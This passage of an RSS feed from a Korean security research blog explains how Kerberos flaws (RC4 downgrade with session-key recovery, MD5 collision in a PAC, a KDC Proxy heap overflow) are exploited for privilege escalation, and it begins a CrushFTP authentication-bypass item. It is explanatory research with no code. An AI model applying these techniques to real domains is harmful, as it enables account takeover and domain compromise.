&#xC704;&#xC784;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2022-33647-amp-CVE-2022-33679"><a href="#CVE-2022-33647-amp-CVE-2022-33679" class="headerlink" title="CVE-2022-33647 &amp; CVE-2022-33679"></a>CVE-2022-33647 &amp; CVE-2022-33679</h2><p><strong>CVE-2022-33647</strong>&#xACFC; <strong>CVE-2022-33679</strong>&#xB294; &#xAD6C;&#xAE00; Project Zero &#xC758; James Forshaw &#xAC00; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, Kerberos &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC911; RC4 &#xC554;&#xD638;&#xD654; &#xC0AC;&#xC6A9;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC5EC; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4; &#xB4F1;&#xC758; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654; &#xD558;&#xACE0; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Kerberos &#xAC00; &#xC6D0;&#xB798;&#xB294; AES &#xAE30;&#xBC18; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC120;&#xD638;&#xD558;&#xC9C0;&#xB9CC; &#xD558;&#xC704; &#xD638;&#xD658;&#xC131; &#xB54C;&#xBB38;&#xC5D0; RC4-HMAC(MD4) &#xBC29;&#xC2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xAE30;&#xC5D0; &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;&#xC5D0;&#xC11C;&#xB294; RC4 &#xB97C; &#xAC15;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; AS-REQ &#xB97C; KDC&#xC5D0; &#xC804;&#xB2EC;&#xD560; &#xB54C; etype &#xC774;&#xB77C;&#xB294; &#xC815;&#xC218;&#xD615; &#xD544;&#xB4DC;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBC84;&#xB294; &#xC774;&#xB97C; &#xBC1B;&#xACE0;&#xC11C; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC81C;&#xC2DC;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>CVE-2022-33647 &#xB97C; Exploit &#xD558;&#xAE30; &#xC704;&#xD574; Forshaw &#xD615;&#xB2D8;&#xC774; &#xC0AC;&#xC6A9;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xB180;&#xB77C;&#xC6B4;&#xB370;&#xC694;. &#xD55C; &#xBC88; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC778;&#xC99D;&#xD560; &#xB54C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC804; &#xC778;&#xC99D; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;&#xAC00; &#xC5C6;&#xB294; &#xC694;&#xCCAD;&#xC744; KDC&#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. KDC&#xB294; &#xADF8;&#xB7EC;&#xBA74; KDC_ERR_PREAUTH_REQUIRED &#xB77C;&#xB294; &#xC5D0;&#xB7EC; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD574;&#xC11C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC624;&#xB958; &#xC751;&#xB2F5;&#xC5D0;&#xC11C;&#xB294; &#xD544;&#xC694;&#xD55C; &#xC554;&#xD638;&#xD654; &#xBAA9;&#xB85D; &#xB4F1;&#xC744; &#xC2E4;&#xC5B4;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB294;&#xB370;&#xC694;. MITM &#xC744; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; AS-REQ &#xB97C; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74;&#xC11C; &#xC5D0;&#xB7EC;&#xC5D0; RC4-MD4 &#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB123;&#xC5B4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; RC4-MD4 &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. RC4&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AS-REQ &#xB97C; &#xB9B4;&#xB808;&#xC774;&#xD558;&#xC5EC; KDC&#xC5D0; &#xBCF4;&#xB0B4;&#xC5B4; AS-REP &#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC790; &#xADF8;&#xB7EC;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB294; RC4&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AS-REQ &#xC640; AS-REP &#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC138;&#xC158;&#xD0A4;&#xC640; TGT&#xB97C; &#xC5BB;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. AS-REQ &#xC5D0;&#xB294; PA-ENC-TS-ENC &#xB77C;&#xACE0; &#xD558;&#xB294; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xAC00; &#xC788;&#xACE0; AS-REP &#xB294; EncASRepPart &#xB77C;&#xACE0; &#xD558;&#xB294; &#xC554;&#xD638;&#xD654; &#xC751;&#xB2F5; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xB904;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/4.png" alt></p><p>RC4 &#xB294; &#xC0DD;&#xC131;&#xB41C; &#xC2A4;&#xD2B8;&#xB9BC; &#xD0A4;&#xB85C; XOR &#xC744; &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4; &#xBCF4;&#xB2C8;, &#xC554;&#xD638;&#xBB38;&#xACFC; &#xD3C9;&#xBB38;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xC2A4;&#xD2B8;&#xB9BC; &#xD0A4;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xC591; &#xCABD;&#xC774; &#xB178;&#xB780;&#xC0C9;&#xC778; &#xACBD;&#xC6B0; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xACC4;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC774;&#xC8E0;.</p><ul><li>RC4-MD4 &#xBC29;&#xC2DD;&#xC740; 16&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC55E; 5&#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xB79C;&#xB364;&#xC774;&#xACE0; 11&#xBC14;&#xC774;&#xD2B8;&#xB294; 0xAB&#xB85C; &#xACE0;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p>&#xCD08;&#xB85D;&#xC0C9; &#xD45C;&#xC2DC;&#xB294; ASN.1 &#xAD6C;&#xC870;&#xC774;&#xAE30;&#xC5D0; &#xC54C;&#xACE0; &#xC788;&#xAC70;&#xB098; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B4;&#xC774; &#xC88B;&#xAC8C;&#xB3C4; &#xC138;&#xC158;&#xD0A4;&#xC758; 4&#xBC14;&#xC774;&#xD2B8; &#xC815;&#xB3C4;&#xAC00; overlap &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; &#xBCF5;&#xD638;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0; 1&#xBC14;&#xC774;&#xD2B8;&#xB294; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4;&#xB97C; &#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4;&#xB294; KDC&#xC5D0; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; 256&#xBC88; &#xC694;&#xCCAD;&#xD558;&#xC5EC; &#xC815;&#xC0C1; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09; &#xBC1B;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC774;&#xB807;&#xAC8C; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B4;&#xACE0; &#xD2F0;&#xCF13; &#xBCF5;&#xD638;&#xD654;&#xAE4C;&#xC9C0; &#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2022-33679&#xC758; &#xACBD;&#xC6B0;&#xB294; Keberos &#xC758; &#xC0AC;&#xC804; &#xC778;&#xC99D; (pre-authentication) &#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xB41C; &#xACC4;&#xC815;&#xC774; &#xC788;&#xC73C;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xACC4;&#xC815;&#xC5D0; &#xB300;&#xD574; &#xC9C1;&#xC811; KDC&#xC5D0; AS-REQ &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; RC4-MD4 &#xBC29;&#xC2DD;&#xC758; TGT&#xB97C; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC774; &#xAEBC;&#xC838; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; KDC&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC99D;&#xBA85;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB294;&#xB370;&#xB3C4; KDC&#xB294; AS-REP&#xB97C; &#xB97C; &#xD1B5;&#xD574; RC4 &#xC554;&#xD638;&#xD654;&#xB41C; TGT &#xC640; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; Exploit &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xB300;&#xC2E0;&#xC5D0; &#xC624;&#xB77C;&#xD074; &#xD328;&#xB529;&#xCC98;&#xB7FC; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504; &#xB4A4;&#xCABD;&#xC73C;&#xB85C; &#xB110; &#xAC12;&#xC744; &#xBD99;&#xC5EC; &#xB098;&#xAC00; KDC&#xC5D0;&#xC11C; &#xC815;&#xC0C1; &#xC751;&#xB2F5;&#xC744; &#xD558;&#xBA74; &#xD0A4;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B4;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2022-37966"><a href="#CVE-2022-37966" class="headerlink" title="CVE-2022-37966"></a>CVE-2022-37966</h2><p>CVE-2022-37966 &#xC740; 2022 &#xBE14;&#xB799;&#xD587; &#xC720;&#xB7FD;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB54C; &#xB2F9;&#xC2DC; Kerberos &#xC5D0;&#xC11C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xC6D0;&#xB418;&#xB358; RC4_HMAC_MD5 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC0AC;&#xC6A9; &#xC2DC; PAC &#xBCC0;&#xC870; &#xD6C4; MD5 &#xCF5C;&#xB9AC;&#xC83C;&#xC744; &#xD1B5;&#xD574; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>PAC &#xB0B4;&#xC5D0;&#xB294; &#xC784;&#xC758;&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xC5F4;&#xC744; &#xB123;&#xC744;&#xB9CC;&#xD55C;, &#xCEE8;&#xD2B8;&#xB864; &#xAC00;&#xB2A5;&#xD55C; &#xD544;&#xB4DC;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; LogonScript &#xD544;&#xB4DC;&#xB97C; &#xC4F0;&#xBA74; &#xAE34; &#xAE38;&#xC774;&#xC758; UTF-16 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB123;&#xC744; &#xC218; &#xC788;&#xC5B4;&#xC11C; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; MD5 &#xCF5C;&#xB9AC;&#xC804;&#xC744; &#xC720;&#xBC1C;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; Exploit &#xD558;&#xB824;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; MD5 hash &#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC774; &#xD3EC;&#xD568;&#xB41C; PAC&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC2E4;&#xC81C; &#xC5F0;&#xAD6C;&#xC5D0;&#xC11C;&#xB3C4; HashClash&#xB85C; &#xC57D; 7 &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xC18C;&#xC694;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD55C; &#xBC88; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0B4;&#xBA74; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC2DC;&#xAC04;&#xC744; &#xD22C;&#xC790;&#xD560;&#xB9CC; &#xD55C; &#xAC83; &#xAC19;&#xB124;&#xC694;. </p><h2 id="CVE-2024-43639"><a href="#CVE-2024-43639" class="headerlink" title="CVE-2024-43639"></a>CVE-2024-43639</h2><p>CVE-2024-43639 &#xB294; ZDI &#xC5D0; &#xC81C;&#xBCF4;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, KDC Proxy (kdcsvc) &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Integer Overflow &#xC5D0; &#xC758;&#xD55C; Heap Overflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows KDC Proxy &#xB294; Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; HTTP&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85D;&#xC2DC; &#xD574;&#xC8FC;&#xB294; Windows Server &#xAD6C;&#xC131;&#xC694;&#xC18C; &#xC785;&#xB2C8;&#xB2E4;. kdcsvc &#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; kpssvc.dll &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACC4;&#xC18D; Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xB85C;&#xC9C0;&#xCEEC; &#xBC84;&#xADF8;&#xB9CC; &#xBCF4;&#xB2E4;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xBC84;&#xADF8;&#xB97C; &#xBCF4;&#xB2C8; &#xBC18;&#xAC11;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xC2E0;&#xAE30;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xB124;&#xC694;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>Kerberos &#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xC640; Windows &#xAD6C;&#xD604;, &#xAD00;&#xB828; &#xACF5;&#xACA9;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xAE4C;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. Kerberos &#xB294; &#xAC15;&#xD55C; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xC9C0;&#xB9CC; &#xC124;&#xC815;&#xC0C1;&#xC758; &#xC624;&#xB958;&#xB098; &#xAD6C;&#xD604;&#xC0C1;&#xC758; &#xBBF8;&#xBE44;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xACA9;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB178;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xC758; &#xC8FC;&#xC81C;&#xB294; &#xC544;&#xC9C1; &#xBBF8;&#xC815;&#xC774;&#xC9C0;&#xB9CC; &#xC7AC;&#xBC0C;&#xB294; &#xC8FC;&#xC81C;&#xB85C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xBD59;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#x1F642;</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><p><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a>)</p></li><li><p><a href="https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication">https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication</a></p></li><li><p><a href="https://www.varonis.com/blog/kerberos-attack-silver-ticket">https://www.varonis.com/blog/kerberos-attack-silver-ticket</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos">https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos</a></p></li><li><p><a href="https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/">https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/</a></p></li><li><p><a href="https://www.hackthebox.com/blog/as-rep-roasting-detection">https://www.hackthebox.com/blog/as-rep-roasting-detection</a></p></li><li><p><a href="https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/">https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/</a></p></li><li><p><a href="https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html">https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</a></p></li><li><p><a href="https://syfuhs.net/a-bit-about-kerberos">https://syfuhs.net/a-bit-about-kerberos</a></p></li><li><p><a href="https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf">https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf</a></p></li><li><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/">https://www.thehacker.recipes/ad/movement/kerberos/</a></p></li><li><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p></li><li><p><a href="https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/">https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview">https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></p></li><li><p><a href="https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/">https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926</a></p></li><li><p><a href="https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639">https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication/">Authentication</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kerberos/">Kerberos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-31161: CrushFTP의 파라미터 오버로딩으로 인한 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/</link>
      <guid>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/</guid>
      <pubDate>Sat, 19 Apr 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://projectdiscovery.io/blog/crushftp-authentic</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://projectdiscovery.io/blog/crushftp-authentication-bypass">https://projectdiscovery.io/blog/crushftp-authentication-bypass</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CrushFTP 11.0.0 &#x2264; 11.3.0</li><li>CrushFTP 10.0.0 &#x2264; 11.8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p><em>&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC740; 3&#xC6D4; 21&#xC77C; CVE-2025-2825&#xB85C; &#xBD80;&#xC5EC;&#xB41C; &#xBC14; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD55C; Outpost24&#xB294; &#xAD00;&#xB828; &#xB0B4;&#xC6A9;&#xC744; CrushFTP&#xC5D0; &#xC81C;&#xBCF4;&#xD558;&#xC5EC; &#xACE0;&#xAC1D;&#xB4E4;&#xC5D0;&#xAC8C; &#xBCF4;&#xC548; &#xAD8C;&#xACE0; &#xC548;&#xB0B4;&#xC640; MITRE&#xB97C; &#xD1B5;&#xD574; CVE &#xBC1C;&#xAE09;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB358; &#xC911;, Vulncheck&#xC0AC;&#xB294; ITW&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC5B4; &#xBE60;&#xB978; &#xC870;&#xCE58;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xBA70; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; CVE-2025-2825&#xB97C; &#xBC1C;&#xAE09; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</em></p><p><em>&#xC774;&#xD6C4; 3&#xC6D4; 27&#xC77C; Mitre&#xB294; Vuluncheck&#xC0AC;&#xC5D0;&#xC11C; &#xBD80;&#xC5EC;&#xD55C; CVE-2025-2825&#xB294; Reject&#xD558;&#xACE0; CVE-2025-31161&#xB85C; &#xBD80;&#xC5EC;&#xB97C; &#xD558;&#xC5EC; <strong>&#xD604;&#xC7AC;&#xB294; CVE-2025-31161</strong>&#xB85C; &#xCD94;&#xC801;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</em></p></blockquote><p>CrushFTP&#xB294; AWS&#x202F;S3&#xC640; &#xD638;&#xD658;&#xB418;&#xB294; API&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; API&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xC778;&#xC99D; &#xAD00;&#xB828; &#xD50C;&#xB798;&#xADF8;&#xAC00;</strong> &#xD30C;&#xB77C;&#xBBF8;&#xD130; 